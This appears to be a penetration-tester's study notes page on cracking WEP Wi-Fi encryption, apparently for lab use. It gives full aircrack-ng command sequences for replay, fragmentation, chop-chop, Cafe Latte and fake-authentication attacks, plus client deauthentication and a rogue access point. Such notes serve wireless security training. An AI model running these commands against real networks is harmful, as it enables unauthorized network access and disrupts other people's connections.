---
title: WEP (Wired Equivalent Privacy)
parent: Wireless Attack
layout: default
nav_order: 2
---

You can disable monitor mode anytime with `sudo airmon-ng stop wlan0mon`

## ARP Request Replay Attack (with ARP request, client needed)

1. Monitor mode:\
   `sudo airmon-ng start wlan0`
2. Confirm it is in and get the interface name:\
   `iwconfig`
3. Start with this to find the network interested in:\
   `sudo airodump-ng wlan0mon --band abg`
4. Once you find it be specific on channel, also write it to file (optional to use `--bssid`):\
   `sudo airodump-ng wlan0mon -c 1 -w WEPfile`
5. Open ANOTHER TERMINAL and launch ARP request replay attack (b is the BSSID of the AP and h is the station/client MAC):\
   `sudo aireplay-ng -3 -b B2:D1:AC:E1:21:D1 -h 4A:DD:C6:71:5A:3B wlan0mon`
6. Let it run for a while, then use aircrack-ng to crack it:\
   `aircrack-ng -b B2:D1:AC:E1:21:D1 WEPfile-01.cap`

## Fragmentation Attack (no ARP request, client needed)

1. Monitor mode:\
   `sudo airmon-ng start wlan0`
2. Confirm it is in and get the interface name:\
   `iwconfig`
3. Start with this to find the network interested in:\
   `sudo airodump-ng wlan0mon --band abg`
4. Once you find it be specific on channel, also write it to file (optional to use `--bssid`):\
   `sudo airodump-ng wlan0mon -c 1 -w WEPfile`
5. Open ANOTHER TERMINAL and launch fragmentation attack (b is the BSSID of the AP and h is the station/client MAC):\
   `sudo aireplay-ng -5 -b B2:D1:AC:E1:21:D1 -h 4A:DD:C6:71:5A:3B wlan0mon`
6. You should receive something like cap file and xor wrote (press y when asked). Next use below on the cap file to obtain source and destination IP:\
   `tcpdump -s 0 -n -e -r replay_src-0805-191842.cap`
7. Access point mac in `-a`, station MAC in `-h`, access point IP in `-k`, station IP in `-l`, xor file `-y`, output ARP file `-w`. If no IP from the above can put 255.255.255.255 for both `-k` and `-l`:\
   `packetforge-ng -0 -a A2:BD:32:EB:21:15 -h 42:E9:11:39:88:AE -k 192.168.1.1 -l 192.168.1.129 -y fragment-0805-191851.xor -w forgedarp.cap`
8. Inject this back to generate IV using interactive packet replay (`-h` is station MAC and `-r` is the output from above):\
   `sudo aireplay-ng -2 -r forgedarp.cap -h 42:E9:11:39:88:AE wlan0mon`
9. Can open another new terminal if you want it to be faster (3 terminal now):\
    `sudo aireplay-ng -3 -b A2:BD:32:EB:21:15 -h 42:E9:11:39:88:AE wlan0mon`
10. Crack it after a while:\
    `aircrack-ng -b A2:BD:32:EB:21:15 WEPfile-01.cap`

## Korek Chop Chop Attack (Client needed)

1. Monitor mode:\
   `sudo airmon-ng start wlan0`
2. Confirm it is in and get the interface name:\
   `iwconfig`
3. Start with this to find the network interested in:\
   `sudo airodump-ng wlan0mon --band abg`
4. Once you find it be specific on channel, also write it to file (optional to use `--bssid`):\
   `sudo airodump-ng wlan0mon -c 1 -w WEPfile`
5. Open ANOTHER TERMINAL and launch Korek Chop Chop attack (b is the BSSID of the AP and h is the station/client MAC):\
   `sudo aireplay-ng -4 -b C8:D1:4D:EA:21:A6 -h 7E:8D:FC:DD:D7:2C wlan0mon`
6. You should receive something like cap file and xor wrote (press y when asked). Next use below on the cap file to obtain source and destination IP:\
   `tcpdump -s 0 -n -e -r replay_dec-0805-191842.cap`
7. Access point mac in `-a`, station MAC in `-h`, access point IP in `-k`, station IP in `-l`, xor file `-y`, output ARP file `-w`. (Not sure: If no IP from the above can put 255.255.255.255 for both `-k` and `-l`):\
   `packetforge-ng -0 -a A2:BD:32:EB:21:15 -h 42:E9:11:39:88:AE -k 192.168.1.1 -l 192.168.1.129 -y replay_dec-1229-160018.xor -w forgedarp.cap`
8. Inject this back to generate IV using interactive packet replay (`-h` is station MAC and `-r` is the output from above):\
   `sudo aireplay-ng -2 -r forgedarp.cap -h 7E:8D:FC:DD:D7:2C wlan0mon`
9. Can open another new terminal if you want it to be faster (3 terminal now):\
    `sudo aireplay-ng -3 -b C8:D1:4D:EA:21:A6 -h 7E:8D:FC:DD:D7:2C wlan0mon`
10. Crack it after a while:\
    `aircrack-ng -b C8:D1:4D:EA:21:A6 WEPfile-01.cap `

## Cafe Latte Attack

1. Monitor mode:\
   `sudo airmon-ng start wlan0`
2. Confirm it is in and get the interface name:\
   `iwconfig`
3. Start with this to find the network interested in:\
   `sudo airodump-ng wlan0mon --band abg`
4. Once you find it be specific on channel, also write it to file (optional to use `--bssid`):\
   `sudo airodump-ng wlan0mon -c 1 -w WEPfile`
5. Open ANOTHER TERMINAL and launch Cafe Latte attack (b is the BSSID of the AP and h is the station/client MAC):\
   `sudo aireplay-ng -6 -b B2:D1:AC:E1:21:D1 -h 7E:8D:FC:DD:D7:2C wlan0mon`
6. Open ANOTHER TERMINAL and create a fake access point (a is BSSID, e is ESSID, c is channel, W 1 is WEP, L is Cafe Latte):\
   `sudo airbase-ng -c 1 -a B2:D1:AC:E1:21:D1 -e "HackTheWifi" wlan0mon -W 1 -L`
7. Deauthenticate the client from actual AP and force them to join us:\
   `sudo aireplay-ng -0 10 -a B2:D1:AC:E1:21:D1 -c B6:1F:98:CB:10:78 wlan0mon`
8. Crack it after a while:\
   `aircrack-ng -b B2:D1:AC:E1:21:D1 WEPfile-01.cap`

## Fake Authentication (Client Not Needed)

1. Monitor mode:\
   `sudo airmon-ng start wlan0`
2. Confirm it is in and get the interface name:\
   `iwconfig`
3. Start with this to find the network interested in:\
   `sudo airodump-ng wlan0mon --band abg`
4. Once you find it be specific on channel, also write it to file (optional to use `--bssid`):\
   `sudo airodump-ng wlan0mon -c 1 -w WEPfile`
5. Open ANOTHER TERMINAL and try fake authentication with (ESSID in e, AP MAC in a, our own MAC in h, keep alive interval in q):\
   `sudo aireplay-ng -1 1000 -o 1 -q 5 -e HTB-Wireless -a 60:38:E0:71:E9:DC -h 00:c0:ca:98:3e:e0 wlan0mon`
6. Open ANOTHER TERMINAL and use Korek or fragmentation. Example here is Korek (b is BSSID, h is our own MAC):
   `sudo aireplay-ng -4 -b 60:38:E0:71:E9:DC -h 00:c0:ca:98:3e:e0 wlan0mon`
7. Access point mac in `-a`, our MAC in `-h`, access point IP in `-k`, our IP in `-l`, xor file `-y`, output ARP file `-w`. (Not sure: If not sure IP just use 255.255.255.255):\
   `packetforge-ng -0 -a 60:38:e0:71:e9:dc -h 00:c0:ca:98:3e:e0 -k 192.168.1.1 -l 192.168.1.64 -y replay_dec-1229-160018.xor -w forgedarp.cap`
8. Inject this back (`-r` is the output from above):\
   `sudo aireplay-ng -2 -r forgedarp.cap wlan0mon`